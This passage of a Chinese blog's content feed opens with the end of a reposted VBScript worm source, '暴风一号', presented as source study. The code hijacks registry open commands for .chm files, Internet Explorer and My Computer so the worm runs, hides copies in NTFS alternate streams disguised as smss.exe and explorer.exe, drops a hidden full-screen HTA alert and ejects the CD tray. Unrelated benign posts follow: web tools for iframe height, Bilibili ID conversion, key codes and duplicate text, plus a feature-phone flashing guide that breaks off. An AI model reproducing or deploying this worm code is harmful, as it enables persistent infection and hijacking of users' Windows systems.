class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" %1 %* "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//篡改IE启动设置</span></span><br><span class="line"><span class="keyword">Sub</span> SetIEAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value</span><br><span class="line">    Value=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" OIE "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_CLASSES_ROOT/CLSID/&#123;871C5380-42A0-1069-A2EA-08002B30309D&#125;/shell/OpenHomePage/Command/"</span>, Value, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//改变我的电脑的打开关联，包括Win+E</span></span><br><span class="line"><span class="keyword">Sub</span> SetMyComputerAss(sFilePath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Value1,Value2</span><br><span class="line">    Value1=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" OMC "</span></span><br><span class="line">    Value2=<span class="string">"%SystemRoot%/System32/WScript.exe "</span>&amp;<span class="string">""""</span>&amp;sFilePath&amp;<span class="string">""""</span>&amp;<span class="string">" EMC "</span></span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_CLASSES_ROOT/CLSID/&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;/shell/"</span>, <span class="string">""</span>, <span class="string">"REG_SZ"</span>)</span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_CLASSES_ROOT/CLSID/&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;/shell/open/command/"</span>, Value1, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line">    <span class="keyword">Call</span> WriteReg(<span class="string">"HKEY_CLASSES_ROOT/CLSID/&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;/shell/explore/command/"</span>, Value2, <span class="string">"REG_EXPAND_SZ"</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//获得系统驱动盘符名 Drive.SerialNumber 盘符序列号 c--&gt;驱动器 C: - 固定&lt;BR&gt;序列号：-1598325125、d--&gt;驱动器 D: - 固定&lt;BR&gt;序列号：237835280、e、f。</span></span><br><span class="line"><span class="keyword">Function</span> GetSerialNumber(Drv)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Set</span> d=fso.GetDrive(Drv)</span><br><span class="line">    GetSerialNumber=d.SerialNumber <span class="comment">'// 返回十进制序列号，用于唯一标识一个磁盘卷。Select Case d.DriveType     Case 0: t = "未知"    Case 1: t = "可移动"    Case 2: t = "固定"</span></span><br><span class="line">                           <span class="comment">'// Case 3: t = "网络"    Case 4: t = "CD-ROM"    Case 5: t = "RAM 磁盘"      End Select</span></span><br><span class="line">    GetSerialNumber=<span class="built_in">Replace</span>(GetSerialNumber,<span class="string">"-"</span>,<span class="string">""</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//获得蠕虫病毒路径   &amp;表示字符串相加  GetSpecialFolder 返回指定的特殊文件夹</span></span><br><span class="line"><span class="keyword">Function</span> GetMainVirus(N)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    MainVirusName=GetSerialNumber(GetSystemDrive())&amp;<span class="string">".vbs"</span></span><br><span class="line">    <span class="keyword">If</span> GetFileSystemType(GetSystemDrive())=<span class="string">"NTFS"</span> <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">If</span> N=<span class="number">1</span> <span class="keyword">Then</span> <span class="comment">'//System 文件夹，包含库、字体和设备驱动程序文件。 SystemFolder</span></span><br><span class="line">              GetMainVirus=Fso.GetSpecialFolder(N)&amp;<span class="string">"/smss.exe:"</span>&amp;MainVirusName <span class="comment">'//返回 如c:/windows/system32/smss.exe:72161642.vbs</span></span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">        <span class="keyword">If</span> N=<span class="number">0</span> <span class="keyword">Then</span> <span class="comment">'//Windows 文件夹，包含 Windows 操作系统安装的文件。 WindowsFolder</span></span><br><span class="line">              GetMainVirus=Fso.GetSpecialFolder(N)&amp;<span class="string">"/explorer.exe:"</span>&amp;MainVirusName <span class="comment">'//返回 如c:/windows/explorer.exe:72161642.vbs</span></span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">          GetMainVirus=Fso.GetSpecialFolder(N)&amp;<span class="string">"/"</span>&amp;MainVirusName</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//返回指定路径vbs脚本的运行个数</span></span><br><span class="line"><span class="keyword">Function</span> VBSProcessCount(VBSPath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> WMIService, ProcessList, Process</span><br><span class="line">    VBSProcessCount=<span class="number">0</span></span><br><span class="line">    <span class="keyword">Set</span> WMIService=<span class="built_in">GetObject</span>(<span class="string">"winmgmts://./root/cimv2"</span>)</span><br><span class="line">    <span class="keyword">Set</span> ProcessList=WMIService.ExecQuery(<span class="string">"Select * from Win32_Process Where "</span>&amp;<span class="string">"Name='cscript.exe' or Name='wscript.exe' or Name='svchost.exe'"</span>)</span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> Process <span class="keyword">in</span> ProcessList</span><br><span class="line">        <span class="keyword">If</span> <span class="built_in">InStr</span>(Process.CommandLine, VBSPath)&gt;<span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">            VBSProcessCount=VBSProcessCount+<span class="number">1</span></span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//'用来计数wscript进程的个数，如果大于等于3个那么返回True</span></span><br><span class="line"><span class="keyword">Function</span> PreDblInstance()</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    PreDblInstance=<span class="literal">False</span></span><br><span class="line">    <span class="keyword">If</span> VBSProcessCount(WScript.ScriptFullName)&gt;= <span class="number">3</span> <span class="keyword">Then</span></span><br><span class="line">        PreDblInstance=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//获取快捷方式的vbs脚本地址</span></span><br><span class="line"><span class="keyword">Function</span> GetTargetPath(LnkPath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Shortcut</span><br><span class="line">    <span class="keyword">Set</span> Shortcut=WshShell.CreateShortcut(LnkPath)</span><br><span class="line">    GetTargetPath=Shortcut.TargetPath</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//读取文件 返回 TextStream</span></span><br><span class="line"><span class="keyword">Function</span> GetCode(FullPath)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> FileText</span><br><span class="line">    <span class="keyword">Set</span> FileText=FSO.OpenTextFile(FullPath, <span class="number">1</span>) <span class="comment">'//打开指定的文件并返回一个 TextStream 对象，可以读取、写入此对象或将其追加到文件。  </span></span><br><span class="line">                           <span class="comment">'// 1 以只读模式打开文件。不能对此文件进行写操作。 </span></span><br><span class="line">    GetCode=FileText.ReadAll <span class="comment">'//读入全部 TextStream 文件并返回结果字符串</span></span><br><span class="line">    FileText.Close</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//获得注册表 版本键值 获取windows版本</span></span><br><span class="line"><span class="keyword">Function</span> GetVersion()</span><br><span class="line">    <span class="keyword">Dim</span> VerInfo</span><br><span class="line">    VerInfo=<span class="string">"HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver"</span></span><br><span class="line">    <span class="keyword">If</span> ReadReg(VerInfo)=<span class="string">""</span> <span class="keyword">Then</span></span><br><span class="line">        GetVersion=<span class="number">0</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        GetVersion=<span class="built_in">CInt</span>(ReadReg(VerInfo)) <span class="comment">'//CInt 返回表达式，此表达式已被转换为 Integer 子类型的 Variant。</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//网页文件BFAlert.hta</span></span><br><span class="line"><span class="keyword">Sub</span> VirusAlert()</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> HtaPath,HtaCode</span><br><span class="line">    HtaPath=Fso.GetSpecialFolder(<span class="number">1</span>)&amp;<span class="string">"/BFAlert.hta"</span></span><br><span class="line">    HtaCode=<span class="string">"&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;暴风一号&lt;/TITLE&gt;"</span>&amp;VBCRLF&amp;<span class="string">"&lt;HTA:APPLICATION APPLICATIONNAME=""BoyFine V1.0"" SCROLL=""no"" windowstate=""maximize"" </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">border=""none"""</span>&amp;VBCRLF&amp;<span class="string">"SINGLEINSTANCE=""yes"" CAPTION=""no"" contextMenu=""no"" ShowInTaskBar=""no"" selection=""no""&gt;"</span>&amp;VBCRLF&amp;<span class="string">"&lt;/HEAD&gt;&lt;BODY bgcolor=#000000&gt;&lt;DIV align </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=""center""&gt;"</span>&amp;VBCRLF&amp;<span class="string">"&lt;font style=""font-size:3500%;font-family:Wingdings;color=red""&gt;N&lt;/font&gt;&lt;BR&gt;"</span>&amp;VBCRLF&amp;<span class="string">"&lt;font style=""font-size:200%;font-family:黑体;color=red""&gt;暴风一号</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/font&gt;"</span>&amp;VBCRLF&amp;<span class="string">"&lt;/DIV&gt;&lt;/BODY&gt;&lt;/HTML&gt;"</span></span><br><span class="line">    <span class="keyword">If</span> FSO.FileExists(HtaPath)=<span class="literal">False</span> <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">Call</span> CreateFile(HtaCode, HtaPath) <span class="comment">'//创建网页文件BFAlert.hta</span></span><br><span class="line">        <span class="keyword">Call</span> SetHiddenAttr(HtaPath) <span class="comment">'//设置隐藏</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Call</span> Run(HtaPath)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//获得感染注册表时间键</span></span><br><span class="line"><span class="keyword">Function</span> GetInfectedDate()</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> DateInfo</span><br><span class="line">    DateInfo=<span class="string">"HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date"</span></span><br><span class="line">    <span class="keyword">If</span> ReadReg(DateInfo)=<span class="string">""</span> <span class="keyword">Then</span></span><br><span class="line">        GetInfectedDate=<span class="string">""</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        GetInfectedDate=<span class="built_in">CDate</span>(ReadReg(DateInfo))</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//弹出光驱</span></span><br><span class="line"><span class="keyword">Sub</span> MakeJoke(Times)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> WMP, colCDROMs</span><br><span class="line">    <span class="keyword">Set</span> WMP = <span class="built_in">CreateObject</span>( <span class="string">"WMPlayer.OCX"</span> ) <span class="comment">'//创建WMPlayer.OCX插件对象</span></span><br><span class="line">    <span class="keyword">Set</span> colCDROMs = WMP.cdromCollection <span class="comment">'//系统中光驱</span></span><br><span class="line">    <span class="keyword">If</span> colCDROMs.Count &gt;<span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">        <span class="keyword">For</span> i=<span class="number">1</span> <span class="keyword">to</span> Times</span><br><span class="line">            colCDROMs.Item(<span class="number">0</span>).eject() <span class="comment">'//退出抽取式设备</span></span><br><span class="line">            WScript.Sleep <span class="number">3000</span></span><br><span class="line">            colCDROMs.Item(<span class="number">0</span>).eject()</span><br><span class="line">        <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Set</span> WMP = <span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><blockquote><p>转载自<a href="https://blog.csdn.net/ccx_john/article/details/39118211" target="_blank" rel="noopener">暴风一号 病毒 源码学习</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>js获取iframe高度</title>
      <link href="/2024/js-huo-qu-iframe-gao-du/"/>
      <url>/2024/js-huo-qu-iframe-gao-du/</url>
      
        <content type="html"><![CDATA[<p>获取 iframe 的高度可以通过访问 iframe 的 contentDocument 对象和 scrollHeight 属性来实现。 <a id="more"></a> 具体方法如下：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'myiframe'</span>);</span><br><span class="line"><span class="keyword">var</span> iframeHeight = iframe.contentDocument.documentElement.scrollHeight;</span><br></pre></td></tr></table></figure><p>这里的 <code>myiframe</code> 是 iframe 的 id， <code>contentDocument</code> 是 iframe 的文档对象， <code>scrollHeight</code> 是文档的滚动高度。如果你要在 iframe 中嵌入一个页面并且想要自适应 iframe 高度，可以使用以下代码：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> setIframeHeight(iframe) &#123;</span><br><span class="line">  <span class="keyword">if</span> (iframe) &#123;</span><br><span class="line">    <span class="keyword">var</span> iframeWin = iframe.contentWindow || iframe.contentDocument.parentWindow;</span><br><span class="line">    <span class="keyword">if</span> (iframeWin.<span class="built_in">document</span>.body) &#123;</span><br><span class="line">      iframe.height = iframeWin.<span class="built_in">document</span>.documentElement.scrollHeight || iframeWin.<span class="built_in">document</span>.body.scrollHeight;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数将根据 iframe 的内容自动调整 iframe 的高度。如果您需要在 iframe 加载完成后自动调整高度，可以使用以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'myiframe'</span>);</span><br><span class="line">iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  setIframeHeight(iframe);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>请注意，在不同的浏览器和环境中，获取 iframe 高度的方法可能会有所不同。在某些情况下，还需要考虑跨域访问的问题。</p><blockquote><p>转载 <a href="https://juejin.cn/s/js获取iframe高度" target="_blank" rel="noopener">js获取iframe高度</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>B站AV号BV号转换</title>
      <link href="/2024/b-zhan-av-hao-bv-hao-zhuan-huan/"/>
      <url>/2024/b-zhan-av-hao-bv-hao-zhuan-huan/</url>
      
        <content type="html"><![CDATA[<div id="txt_view">哔哩哔哩AV号BV号转换工具，找回隐藏的AV号</div><a id="more"></a><script>document.getElementById("txt_view").style.display = "none";</script><p><input type="text" id="av"><button onclick="return av() && false">AV 号转 BV 号</button><br><br><input type="text" id="bv"><button onclick="return bv() && false">BV 号转 AV 号</button></p><p id="result">结果：</p><script>if(navigator.userAgent.match(/QQ\//i)) {document.getElementById("av").style.display = "none";document.getElementById('bv').style.display='none';document.getElementById('result').innerHTML = `不支持在QQ内使用，请前往浏览器打开`;}</script><script>// 改写自 https://www.zhihu.com/question/381784377/answer/1099438784，并加上一些适当的处理// 我这人虽然是写 JS 的，但是看 Python 不是问题'use strict';const table = [...'fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF'];const s = [11, 10, 3, 8, 4, 6];const xor = 177451812;const add = 8728348608;const av2bv = (av) => {    let num = NaN;    if (Object.prototype.toString.call(av) === '[object Number]') {        num = av;    } else if (Object.prototype.toString.call(av) === '[object String]') {        num = parseInt(av.replace(/[^0-9]/gu, ''));    };    if (isNaN(num) || num <= 0) {        // 网页版直接输出这个结果了        return '¿你在想桃子？';    };    num = (num ^ xor) + add;    let result = [...'BV1  4 1 7  '];    let i = 0;    while (i < 6) {        // 这里改写差点犯了运算符优先级的坑        // 果然 Python 也不是特别熟练        // 说起来 ** 按照传统语法应该写成 Math.pow()，但是我个人更喜欢 ** 一些        result[s[i]] = table[Math.floor(num / 58 ** i) % 58];        i += 1;    };    return result.join('');};const bv2av = (bv) => {    let str = '';    if (bv.length === 12) {        str = bv;    } else if (bv.length === 10) {        str = `BV${bv}`;    // 根据官方 API，BV 号开头的 BV1 其实可以省略    // 不过单独省略个 B 又不行（    } else if (bv.length === 9) {        str = `BV1${bv}`;    } else {        return '¿你在想桃子？';    };    if (!str.match(/[Bb][Vv][fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF]{10}/gu)) {        return '¿你在想桃子？';    };    let result = 0;    let i = 0;    while (i < 6) {        result += table.indexOf(str[s[i]]) * 58 ** i;        i += 1;    };    return `av${result - add ^ xor}`;};const av = () => {    let result = av2bv(document.getElementById('av').value);    if (result !== '¿你在想桃子？') {        document.getElementById('result').innerHTML = `结果：<a href="https://www.bilibili.com/video/${result}">${result}</a>`;    } else {        document.getElementById('result').innerHTML = `结果：${result}`;    };};const bv = () => {    let result = bv2av(document.getElementById('bv').value);    if (result !== '¿你在想桃子？') {        document.getElementById('result').innerHTML = `结果：<a href="https://www.bilibili.com/video/${result}">${result}</a>`;    } else {        document.getElementById('result').innerHTML = `结果：${result}`;    };};document.getElementById('av').addEventListener('keydown', (event) => {    if (event.keyCode === 13) {        av();    };});document.getElementById('bv').addEventListener('keydown', (event) => {    if (event.keyCode === 13) {        bv();    };});</script><blockquote><p>哔哩哔哩AV号BV号在线转换工具<br>算法来自 <a href="https://www.zhihu.com/question/381784377/answer/1099438784" target="_blank" rel="noopener">https://www.zhihu.com/question/381784377/answer/1099438784</a><br>源码来自 <a href="https://mrhso.github.io/IshisashiWebsite/BVwhodoneit/" target="_blank" rel="noopener">https://mrhso.github.io/IshisashiWebsite/BVwhodoneit/</a>  </p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>移动soc性能排行榜</title>
      <link href="/2023/yi-dong-soc-pai-xing-bang/"/>
      <url>/2023/yi-dong-soc-pai-xing-bang/</url>
      
        <content type="html"><![CDATA[<p>来自驱动之家快科技的手机CPU性能天梯图<br><a href="https://www.mydrivers.com/zhuanti/tianti/01/" target="_blank" rel="noopener">https://www.mydrivers.com/zhuanti/tianti/01/</a>  <a id="more"></a><br>这个收录的比较全，从联发科最早的安卓处理器MT6516一直到现在的新处理器都能看到排行</p><p>来自极客湾的移动芯片排行<br><a href="http://socpk.com/" target="_blank" rel="noopener">http://socpk.com/</a><br>可以看到多个维度的排行和性能对比，也可以查看极客湾相关的评测视频</p><p><a href="/2021/mtk-xing-neng/">功能机处理器对比</a><br>这个是个人收集的，mtk功能机的排行，比较全了，mt6276/6255据说是当时联发科安卓cpu阉割下放，性能还是很强的，在一些6235/36以后的机子还能见到一些联发科功能机原生cos/mos系统，也值得收藏下</p><iframe align="center" src="//player.bilibili.com/player.html?aid=351483438&high_quality=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>  <p>联发科Cosmos类智能手机OS用户体验全流程设计与评估项目【TANG】<br><a href="https://www.bilibili.com/video/BV1XR4y1z7Vo/" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1XR4y1z7Vo/</a></p><iframe align="center" src="//player.bilibili.com/player.html?aid=821377087&high_quality=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>  <p>MTK曾经的手机系统（高度借鉴安卓UI）<br><a href="https://www.bilibili.com/video/BV13G4y1T7fd/" target="_blank" rel="noopener">https://www.bilibili.com/video/BV13G4y1T7fd/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>键盘键值获取</title>
      <link href="/2023/jian-pan-jian-zhi-huo-qu/"/>
      <url>/2023/jian-pan-jian-zhi-huo-qu/</url>
      
        <content type="html"><![CDATA[<p>一个简单的网页小工具<br>用于获取键盘动作和获取键值<a id="more"></a>  </p><center>    <textarea style="width: 95%;max-width: 1024px;" id="text_input" type="text" placeholder="点击输入框后按下键盘" rows="2" autofocus></textarea></center><br><center>    <textarea style="width: 95%;max-width: 1024px;" id="text_log" type="text" placeholder="log" rows="10" autofocus readonly></textarea></center><script>    let text_in = document.getElementById("text_input"),    text_log = document.getElementById("text_log");    function logMsg(msg) {        text_log.innerHTML += `${msg}\n`;        text_log.scrollTop = text_log.scrollHeight;    }    text_in.addEventListener("keydown", (e) => {        if (!e.repeat) {            logMsg(`按下 "${e.key}" 键 键值 "${e.keyCode}" [事件：keydown]`);        } else {            logMsg(`重复 "${e.key}" 键 键值 "${e.keyCode}" [事件：keydown]`);        }    });    text_in.addEventListener("beforeinput", (e) => {        logMsg(`即将输入 "${e.data}" 键 [事件：beforeinput]`);    });    text_in.addEventListener("input", (e) => {        logMsg(`输入 "${e.data}" 键 [事件：input]`);    });    text_in.addEventListener("keyup", (e) => {        logMsg(`释放 "${e.key}" 键 键值 "${e.keyCode}" [事件：keyup]\n`);    });</script><script>if(navigator.userAgent.match(/QQ\//i)) {document.getElementById("text_input").style.display = "none";logMsg(`不支持在QQ内使用，请更换浏览器打开`);}</script><p>参考：KeyboardEvent.key - Web API 接口 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/KeyboardEvent/key" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/KeyboardEvent/key</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>重复查找</title>
      <link href="/2023/chong-fu-cha-zhao/"/>
      <url>/2023/chong-fu-cha-zhao/</url>
      
        <content type="html"><![CDATA[<p>在网页上实现一个简单功能/小工具<br>检测上方文本框是否包含下方文本框中的内容<a id="more"></a></p><center><textarea style="width: 95%;max-width: 1024px;" id="text_all" type="text" placeholder="请输入内容" rows="10" autofocus></textarea></center><br><center><textarea oninput="inText()" style="width: 95%;max-width: 1024px;" id="text_in" type="text" placeholder="请输入内容，回车发起检查" rows="2" autofocus></textarea></center><audio src="/game/star/sound/ppop.ogg" id="bg_di" preload="auto"></audio><audio src="/2020/miaoa-yousa/yousa.mp3" id="bg_ok" preload="auto"></audio><script type="text/javascript">function inText(){  var text_in = document.getElementById("text_in").value;  var pos = text_in.indexOf('\n');  if(pos != -1){   var audio = document.getElementById("bg_di");   audio.play();   text_in = text_in.substring(0,pos);   var text_all = document.getElementById("text_all").value;   if(text_all.length == 0 || text_in.length==0){    alert("未输入内容");   } else {    if(text_all.includes(text_in)){     var audio = document.getElementById("bg_ok");     audio.play();     alert("找到重复项\n"+text_in);    }   }   document.getElementById("text_in").value = "";  } }</script><script>if(navigator.userAgent.match(/QQ\//i)) {document.getElementById("text_in").style.display = "none";document.getElementById('text_all').style.display='none';}</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>功能机刷机</title>
      <link href="/2023/gong-neng-ji-shua-ji/"/>
      <url>/2023/gong-neng-ji-shua-ji/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/preloader.gif" data-original="/2023/gong-neng-ji-shua-ji/title.jpeg" alt="img"></p><h3 id="给老年功能机刷机备份系统是什么体验？"><a href="#给老年功能机刷机备份系统是什么体验？" class="headerlink" title="给老年功能机刷机备份系统是什么体验？"></a>给老年功能机刷机备份系统是什么体验？</h3><p>这里以目前市面上最多的联发科mt6260/6261 soc的功能机为例（mtk山寨智能手表通用）<a id="more"></a><br>我的功能机是菲乐普E10。mt6260/6261好多支持vxp格式的软件（前期是沃勤vre平台，据说后期被mtk收购，变成mre平台），还有掌盟互娱平台，功能机有QQ，微信好多都是掌盟。也有支持冒泡平台。  </p><p><img src="/img/preloader.gif" data-original="1.jpg" alt="img"><br><img src="/img/preloader.gif" data-original="2.jpg" alt="img"><br><img src="/img/preloader.gif" data-original="3.jpg" alt="img"></p><p>由于功能机的原厂线刷包不好找，几乎找不到。所以给功能机刷机备份当前的系统很重要，以为一旦翻车，就找不到合适系统刷回去了。<br>首先确定目前功能机的soc型号。【这里用到的是以前一个老的功能机维修仪器软件，网上找得到和谐版。因为这个软件对最新的功能机备份系统（读字库）和刷入系统（写字库）支持不是很好。所以备份和刷入要靠联发科官方的线刷软件，和安卓早期的线刷软件基本一样。】这里已经提前mtk刷机驱动。<br>图片上的手机显示是mtk6261的CPU，联机方式是USB联机，按的是#号键插入USB联机（功能机联机按键不同手机可能不同）。稍后的刷机也是这个操作<img src="/img/preloader.gif" data-original="/coolapk-emotion/81_naikezui.gif" alt="img"></p><p><img src="/img/preloader.gif" data-original="4.jpg" alt="mt6261"></p><p>接下来去找其他功能机同CPU刷机包，国内的论坛貌似只有东海还有功能机的字库备份分享。国外的倒有很多。不过好多是英文界面。<br>这里随便找了一个网站如图。  </p><p><img src="/img/preloader.gif" data-original="5.jpg" alt="img"></p><p>下载一个合适的压缩包解压，里面有一个config_mtk.cfg文件，类似于安卓线刷里面的MT65xx_Android_scatter.txt作用</p><p><img src="/img/preloader.gif" data-original="6.jpg" alt="img"></p><p>然后打开mtk sp线刷工具，线刷过老安卓手机的应该很熟悉。点击scatter载入cfg文件</p><p><img src="/img/preloader.gif" data-original="7.jpg" alt="img"></p><p>接下来点击memory test内存测试，点击start后，按#键，插USB联机，显示如图</p><p><img src="/img/preloader.gif" data-original="8.jpg" alt="img"></p><p>记住那个nor flash里面的值，等下备份字库用得到。<br>断开数据线后，点击软件里面的read back回读功能，点击add添加，然后双击横线位置填写刚才的内存测试里面的值点击OK保存，保存文件名可以任意,你自己认识就行（默认ROM_0，常见备份文件名是改成**.bin）。  </p><p><img src="/img/preloader.gif" data-original="9.jpg" alt="img"></p><p>最后点击read back，准备开始回读。然后功能机联机（和之前一样，先按#不放在插数据线到电脑）<br>回读完成有绿色圆圈提示，就备份好了当前的字库  </p><p><img src="/img/preloader.gif" data-original="10.jpg" alt="img"><br><img src="/img/preloader.gif" data-original="11.jpg" alt="img"></p><p>检查备份提取的文件体积是不是有异常，没有问题继续。</p><p><img src="/img/preloader.gif" data-original="12.jpg" alt="img"></p><p>接下来用到这个软件，可以分解备份回读的字库文件（bin）。点第一步载入回读文件</p><p><img src="/img/preloader.gif" data-original="13.jpg" 